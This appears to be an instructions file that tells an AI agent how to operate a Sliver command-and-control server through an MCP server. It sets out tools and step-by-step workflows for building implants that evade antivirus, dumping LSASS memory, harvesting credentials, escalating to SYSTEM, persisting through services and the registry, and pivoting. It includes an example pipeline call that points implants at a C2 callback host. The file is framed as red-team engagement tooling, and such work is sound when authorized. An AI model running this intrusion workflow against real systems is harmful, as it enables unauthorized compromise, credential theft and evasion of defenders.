# sliver-mcp - Agent Instructions

## Overview

This MCP server provides full programmatic access to a Sliver C2 server via
gRPC (mTLS), plus an evasion build pipeline, engagement state tracking, OPSEC
safety checks, operator playbooks, and cleanup tools.

## Quick Start Workflow

1. **`sliver_status`** - Verify the gRPC connection is live.
2. **`sliver_sessions`** - List active implants. You need a `session_id` for interaction tools.
3. Use session tools (`sliver_execute`, `sliver_ls`, etc.) with the session ID.
4. **`sliver_state_summary`** - View the engagement dashboard.

## Tool Reference

### Server / Connection
| Tool | Purpose |
|------|---------|
| `sliver_status` | Check connection and server version |
| `sliver_jobs` | List running listeners/stagers |
| `sliver_start_https_listener` | Start an HTTPS C2 listener |
| `sliver_start_http_listener` | Start an HTTP C2 listener |
| `sliver_start_dns_listener` | Start a DNS C2 listener |
| `sliver_stop_job` | Kill a listener by job ID |

### Session / Beacon Management
| Tool | Purpose |
|------|---------|
| `sliver_sessions` | List all interactive sessions |
| `sliver_beacons` | List all beacons (async implants) |
| `sliver_kill_session` | Terminate a session |
| `sliver_kill_beacon` | Terminate a beacon |
| `sliver_rename_session` | Rename a session for tracking |
| `sliver_rename_beacon` | Rename a beacon for tracking |
| `sliver_generate` | Build a new implant payload via Sliver |
| `sliver_regenerate_implant` | Regenerate a previously built implant |
| `sliver_implant_builds` | List historical implant builds |
| `sliver_operators` | List connected operators |

### Evasion Pipeline
| Tool | Purpose |
|------|---------|
| `sliver_encrypt_shellcode` | AES-256 encrypt raw shellcode |
| `sliver_build_loaders` | Compile Nim evasion loaders (remote + local) |
| `sliver_evasion_pipeline` | End-to-end: generate -> encrypt -> build in one call |
| `sliver_preflight_defender` | Scan a built loader with Windows Defender |

### Implant Interaction (require session_id)
| Tool | Purpose |
|------|---------|
| `sliver_execute` | Run a command (exe + args) |
| `sliver_ls` | Directory listing |
| `sliver_cd` | Change working directory |
| `sliver_pwd` | Print working directory |
| `sliver_ps` | Process listing |
| `sliver_netstat` | Network connections |
| `sliver_ifconfig` | Network interfaces |
| `sliver_upload` | Send file to target |
| `sliver_download` | Retrieve file from target |
| `sliver_screenshot` | Capture desktop screenshot |
| `sliver_rm` | Delete file on target |
| `sliver_mkdir` | Create directory on target |

### Post-Exploitation
| Tool | Purpose |
|------|---------|
| `sliver_discovery` | Full host discovery suite |
| `sliver_lateral_check` | Test reachability to a target IP |
| `sliver_collect_evidence` | Gather screenshots and session metadata |

### Advanced Implant Commands
| Tool | Purpose |
|------|---------|
| `sliver_execute_assembly` | Run a .NET assembly in-memory |
| `sliver_execute_shellcode` | Inject and execute shellcode |
| `sliver_sideload` | Sideload a DLL into a process |
| `sliver_terminate_process` | Kill a remote process by PID |
| `sliver_impersonate` | Token impersonation (Windows) |
| `sliver_revert_to_self` | Revert from impersonation |
| `sliver_registry_read` | Read a Windows registry value |
| `sliver_get_env` | Get environment variables |
| `sliver_set_env` | Set environment variables |

### Privilege Escalation / Token Manipulation
| Tool | Purpose |
|------|---------|
| `sliver_get_system` | Elevate to SYSTEM via named pipe |
| `sliver_make_token` | Create logon token with credentials |
| `sliver_run_as` | Execute as a different user |

### Process / Memory
| Tool | Purpose |
|------|---------|
| `sliver_migrate` | Migrate implant to another process |
| `sliver_process_dump` | Dump process memory (e.g. LSASS) |

### Persistence / Services
| Tool | Purpose |
|------|---------|
| `sliver_registry_write` | Write a registry value |
| `sliver_registry_create_key` | Create a registry key |
| `sliver_start_service` | Create and start a Windows service |
| `sliver_stop_service` | Stop a Windows service |
| `sliver_remove_service` | Remove a Windows service |

### Pivoting
| Tool | Purpose |
|------|---------|
| `sliver_socks_start` | Start SOCKS5 proxy through a session |
| `sliver_socks_stop` | Stop SOCKS5 proxy |
| `sliver_portfwd_add` | Forward a remote port through a session |
| `sliver_portfwd_list` | List active port forwards |
| `sliver_portfwd_rm` | Remove a port forward |

### Engagement State Database
| Tool | Purpose |
|------|---------|
| `sliver_state_add_target` | Add/update a target host |
| `sliver_state_targets` | List all tracked targets |
| `sliver_state_add_cred` | Log a harvested credential |
| `sliver_state_creds` | List harvested credentials |
| `sliver_state_add_finding` | Log an engagement finding |
| `sliver_state_findings` | List findings |
| `sliver_state_log_access` | Log an access event |
| `sliver_state_summary` | Engagement dashboard |
| `sliver_state_export` | Export full state to JSON |
| `sliver_state_add_pivot` | Record a pivot path |

### OPSEC Guard
| Tool | Purpose |
|------|---------|
| `sliver_opsec_check` | Scan a session for EDR/AV products |

Pre-flight checks are automatically applied to these high-risk tools:
`execute_assembly`, `execute_shellcode`, `sideload`, `get_system`,
`process_dump`, `migrate`, `make_token`, `registry_write`,
`registry_create_key`, `start_service`

### Operator Playbooks
| Tool | Purpose |
|------|---------|
| `sliver_playbook_initial_recon` | Full recon + auto-target registration |
| `sliver_playbook_privesc_check` | Privilege escalation assessment |
| `sliver_playbook_cred_harvest` | Credential enumeration |
| `sliver_playbook_persist_check` | Persistence opportunity audit |

### Websites
| Tool | Purpose |
|------|---------|
| `sliver_website_add` | Host a file on Sliver's web server |
| `sliver_websites` | List active websites |

### Cleanup
| Tool | Purpose |
|------|---------|
| `sliver_cleanup_target` | Remove all artifacts from a target host |
| `sliver_full_cleanup` | Kill all sessions, stop all listeners |

---

## Workflow Examples

### Full Evasion Pipeline

Build loaders for a target with HTTPS C2 in one call:

```
sliver_evasion_pipeline(
    c2_url="https://10.0.0.1:443",
    callback_ip="10.0.0.1",
    host_label="dc01"
)
```

This generates shellcode via Sliver, encrypts it with AES-256, and compiles both
remote and local Nim loaders.

Or step-by-step:

1. `sliver_generate` - create shellcode
2. `sliver_encrypt_shellcode` - encrypt it
3. `sliver_build_loaders` - compile loaders
4. `sliver_preflight_defender` - verify Defender won't flag it

### Post-Exploitation Playbook

After getting a session:

1. `sliver_opsec_check(session_id)` - check for EDR/AV first
2. `sliver_playbook_initial_recon(session_id)` - full host enumeration
3. `sliver_playbook_privesc_check(session_id)` - look for escalation paths
4. `sliver_playbook_cred_harvest(session_id)` - enumerate credentials
5. `sliver_lateral_check(session_id, target_ip)` - test access to other hosts

### Engagement Tracking

Track targets and findings as you go:

1. Targets are auto-registered by `sliver_playbook_initial_recon`
2. `sliver_state_add_cred(...)` - log creds as you find them
3. `sliver_state_add_finding(...)` - log findings as you discover them
4. `sliver_state_summary()` - check your dashboard
5. `sliver_state_export()` - export for reporting

### End of Engagement

1. `sliver_cleanup_target(session_id)` - remove artifacts from each host
2. `sliver_full_cleanup()` - kill all sessions and stop all listeners
3. `sliver_state_export()` - export final state

---

## Important Notes

- **Session IDs are UUIDs** like `a1b2c3d4-e5f6-...`. Copy them exactly from `sliver_sessions`.
- **sliver_execute** expects exe and args separately:
  - exe=`whoami`, args=`/all`
  - exe=`cmd.exe`, args=`/c ipconfig /all`
  - exe=`powershell.exe`, args=`-Command Get-Process`
- **sliver_discovery** runs each command individually through the implant. No files
  are dropped on the target.
- **sliver_evasion_pipeline** takes 2-5 minutes (shellcode generation + Nim compilation).
- **sliver_preflight_defender** runs on the Windows host. Use Windows paths.
- **Evidence** is saved to `$SLIVER_EVIDENCE_DIR/<session_prefix>/` by default.
- **OPSEC mode** is configurable via `SLIVER_OPSEC_MODE` env var (`warn`/`block`/`silent`).

## Error Handling

If tools return connection errors:
1. Verify `sliver-server` is running
2. Check the operator config exists at the `SLIVER_CONFIG` env var path
3. Generate a config with: `sliver-server operator --name cursor --lhost localhost --save <path>`

For evasion build errors:
1. Ensure Nim + mingw-w64 are installed (`nim --version`)
2. Ensure nimble packages are installed (`nimble install winim nimcrypto`)
3. Ensure `crypto_keys.nim` exists before building (run encrypt first)
